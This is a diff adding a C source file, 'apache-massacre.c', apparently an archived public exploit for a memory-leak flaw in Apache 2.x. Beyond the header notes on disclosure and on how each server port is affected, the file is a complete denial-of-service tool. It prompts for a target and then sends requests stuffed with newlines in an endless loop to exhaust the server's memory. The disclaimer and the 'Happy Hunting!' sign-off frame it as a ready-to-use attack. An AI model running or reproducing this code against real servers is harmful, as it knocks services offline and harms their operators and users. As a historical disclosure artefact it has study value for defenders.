@@ -1,0 +1,155 @@
+/* apache-massacre.c
+* Test code for Apache 2.x Memory Leak
+* By Matthew Murphy
+*
+* DISCLAIMER: This exploit tool is provided only to test networks for a
+* known vulnerability. Do not use this tool on systems you do not control,
+* and do not use this tool on networks you do not own without appropriate
+* consent from the network owner. You are responsible for any damage your
+* use of the tool causes. In no event may the author of this tool be held
+* responsible for damages relating to its use.
+*
+* As with most Apache exposures, the impacts vary between ports of the server:
+*
+* Non-Unix (Win32, Netware, OS/2): These ports are most adversely affected
+* by this, as Apache's child process doesn't terminate normally unless the
+* parent process stops. This means that leaks (and any performance loss) hang
+* around until Apache is restarted.
+*
+* Unix/mpm_prefork: This MPM offers the most protection against successful
+* exploitation, as its processes exit at the end of the request.
+*
+* Unix/other MPMs: These other MPMs utilize multiple Apache processes for 
+* multiple Apache requests. Depending on the MPM in use and the traffic rates
+* of the server, this may be used to the advantage of a potential attacker.
+* If multiple different Apache processes are utilized, an attacker can spread
+* the substantial leak between processes to dodge resource limits imposed on
+* httpd's UID (usually nobody, www, or apache)
+*
+* Credit: iDEFENSE reported this issue to several security lists on April 8,
+* 2003 following the Apache release announcement. Apache fixed the flaw about
+* a month after the initial disclosure of this vulnerability. iDEFENSE credits
+* the discovery of this vulnerability to an anonymous researcher.
+*
+* Happy Hunting!
+*/
+
+#ifndef _WIN32
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <fcntl.h>
+#else
+#include <windows.h>
+#pragma comment(lib, "wsock32.lib")
+#endif
+#include <stdlib.h>
+#include <stdio.h>
+
+int sig_fired = 0;
+
+#ifndef _WIN32
+void sig_handler(int sig) {
+#else
+BOOL WINAPI sig_handler(DWORD dwCtrlType) {
+#endif
+sig_fired = 1;
+#ifndef _WIN32
+return;
+#else
+return TRUE;
+#endif
+}
+
+int main(int argc, char *argv[]) {
+SOCKET s;
+struct sockaddr_in sin;
+char buffer[1025];
+struct hostent *he;
+unsigned short iPort = 80;
+int newlines = 100;
+char *p;
+char *p2;
+int i;
+#ifdef _WIN32
+WSADATA wsa_prov;
+#endif
+printf("Apache Massacre v1.0\r\n");
+printf("Exploit by Matthew Murphy\r\n");
+printf("Vulnerability reported by iDEFENSE Labs\r\n\r\n");
+#ifdef _WIN32
+if (WSAStartup(0x0101, &wsa_prov)) {
+perror("WSAStartup");
+exit(1);
+}
+#endif
+printf("Please enter the web server's host/IP: ");
+fgets(&buffer[0], 1024, stdin);
+he = gethostbyname(&buffer[0]);
+if (!he) {
+perror("gethostbyname");
+exit(1);
+}
+sin.sin_addr.s_addr = *((unsigned long *)he->h_addr);
+printf("Please enter the web server's port: ");
+fgets(&buffer[0], 1024, stdin);
+iPort = (unsigned short)atoi(&buffer[0]);
+#ifndef _WIN32
+#ifdef _SOLARIS
+sigset(SIGINT, &sig_handler);
+#else
+signal(SIGINT, &sig_handler);
+#endif
+#else
+SetConsoleCtrlHandler(&sig_handler, TRUE);
+#endif
+printf("How many newlines should be in each request [100]: ");
+fgets(&buffer[0], 1024, stdin);
+if (!buffer[0] == 0x0D && !buffer[0] == 0x0A) {
+newlines = atoi(&buffer[0]);
+}
+p = malloc(newlines*2);
+p2 = p;
+for (i = 0; i < newlines; i++) {
+*p2 = 0x0D;
+p2++;
+*p2 = 0x0A;
+p2++;
+}
+newlines += newlines;
+s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+if (s < 0) {
+perror("socket");
+exit(1);
+}
+sin.sin_family = AF_INET;
+sin.sin_port = htons(iPort);
+if (connect(s, (const struct sockaddr *)&sin, sizeof(struct sockaddr_in))) {
+perror("connect");
+exit(1);
+}
+while (1) {
+if (!send(s, (char *)p, newlines, 0) == newlines) {
+perror("send");
+exit(1);
+}
+if (sig_fired) {
+printf("Terminating on SIGINT");
+free(p);
+#ifndef _WIN32
+close(s);
+#else
+closesocket(s);
+WSACleanup();
+#endif
+exit(0);
+}
+}
+}
+
+
+// milw0rm.com [2003-04-09]
